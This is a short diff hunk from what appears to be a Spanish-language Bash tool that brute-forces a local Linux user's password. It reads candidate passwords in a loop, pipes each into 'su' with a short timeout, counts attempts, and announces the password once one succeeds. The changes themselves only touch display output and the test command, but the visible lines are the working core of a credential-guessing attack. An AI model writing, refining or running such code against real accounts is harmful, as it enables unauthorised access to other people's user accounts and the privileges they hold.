@@ -66,10 +66,10 @@ while IFS= read -r password; do
 
 let "n_intentos++"
 
-echo -ne "${morado}[>] ${azul}Probando contraseña: ${verde}$password ${reset}"
+echo -ne "${morado}[>] ${azul}Probando contraseña: ${verde}$password \r${reset}"
 echo -ne "${morado}[>] ${azul}Numero de intentos de contraseña: ${verde}$n_intentos\r ${reset}"
 
-if timeout 0.1 bash -c "echo '$password' | su '$usuario' -c 'echo Hello'" >/dev/null 2>&1;then
+if timeout 0.1 bash -c "echo '$password' | su '$usuario' -c 'echo test'" >/dev/null 2>&1;then
 clear
 echo -ne "\n ${azul}Contraseña encontrada: ${verde}$password ${reset}"
 echo
